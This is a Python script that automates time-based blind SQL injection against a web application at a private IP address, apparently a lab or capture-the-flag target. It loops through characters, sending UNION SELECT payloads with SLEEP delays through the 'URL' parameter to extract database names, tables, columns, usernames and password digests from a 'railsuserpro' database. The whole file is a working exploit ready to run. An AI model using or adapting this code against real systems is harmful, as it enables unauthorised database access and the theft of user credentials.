import requests
import time
import string
import sys

characters = string.ascii_letters + string.digits + '$-./ _~'

leaked = ""
last_char = ""
string_counter = 1
item_counter = 0
more = True
still_leaking = True

while True:
    print(f"[DEBUG] Items leaked: {item_counter} | Pending items: {still_leaking} | last_char: {last_char} | leaked: {leaked} | string_counter: {string_counter}")
    if not still_leaking:
        break
    while True:
        if last_char == "~":
            if leaked == "":
               still_leaking = False
            item_counter += 1
            leaked = ""
            string_counter = 1
            last_char = ""
            break

        for char in characters:

            start = time.time()

            # User
            # req = requests.get(f"http://192.168.244.127:33033/slug?URL=joe.webb' UNION SELECT IF((MID(user,{counter},1) = '{char}'), SLEEP(5), 0) FROM mysql.user LIMIT 0,1-- -")

            # Version
            #if char.isdigit():
            #    req = requests.get(f"http://192.168.244.127:33033/slug?URL=joe.webb' AND IF(MID(@@VERSION,{counter},1) = {char}, SLEEP(5), 0)-- -")
            #else:
            #    req = requests.get(f"http://192.168.244.127:33033/slug?URL=joe.webb' AND IF(MID(@@VERSION,{counter},1) = '{char}', SLEEP(5), 0)-- -")

            # Databases
            #req = requests.get(f"http://192.168.244.127:33033/slug?URL=joe.webb' UNION (SELECT IF((SUBSTR(schema_name,1,{string_counter}) LIKE '{leaked+char}%'), SLEEP(4), 0) FROM INFORMATION_SCHEMA.SCHEMATA ORDER BY schema_name asc LIMIT {item_counter},1)-- -")

            # Table
            #req = requests.get(f"http://192.168.244.127:33033/slug?URL=joe.webb' UNION (SELECT IF((SUBSTR(table_name,1,{string_counter}) LIKE '{leaked+char}%'), SLEEP(4), 0) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema = 'railsuserpro' ORDER BY table_name asc LIMIT {item_counter},1)-- -")

            # Column
            #req = requests.get(f"http://192.168.244.127:33033/slug?URL=joe.webb' UNION (SELECT IF((SUBSTR(column_name,1,{string_counter}) LIKE '{leaked+char}%'), SLEEP(4), 0) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name = 'active_storage_attachments' ORDER BY column_name asc LIMIT {item_counter},1)-- -")

            # Passwords
            #req = requests.get(f"http://192.168.244.127:33033/slug?URL=joe.webb' UNION (SELECT IF((SUBSTR(password_digest,1,{string_counter}) LIKE CAST('{leaked+char}%' AS BINARY)), SLEEP(3), 0) FROM railsuserpro.users ORDER BY password_digest asc LIMIT {item_counter},1)-- -")

            # Reminder
            #req = requests.get(f"http://192.168.244.127:33033/slug?URL=joe.webb' UNION (SELECT IF((SUBSTR(reminder,1,{string_counter}) LIKE CAST('{leaked+char}%' AS BINARY)), SLEEP(3), 0) FROM railsuserpro.users ORDER BY reminder asc LIMIT {item_counter},1)-- -")

            # USER
            req = requests.get(f"http://192.168.244.127:33033/slug?URL=joe.webb' UNION (SELECT IF((SUBSTR(username,1,{string_counter}) LIKE CAST('{leaked+char}%' AS BINARY)), SLEEP(3), 0) FROM railsuserpro.users LIMIT {item_counter},1)-- -")

            # Attachment name
            #req = requests.get(f"http://192.168.244.127:33033/slug?URL=joe.webb' UNION (SELECT IF((SUBSTR(name,1,{string_counter}) LIKE CAST('{leaked+char}%' AS BINARY)), SLEEP(3), 0) FROM railsuserpro.active_storage_attachments ORDER BY name asc LIMIT {item_counter},1)-- -")

            if time.time() - start > 3:
                leaked += char
                print(f"[+] Leaking... {leaked}")
                string_counter += 1
                break
            else:
                last_char = char
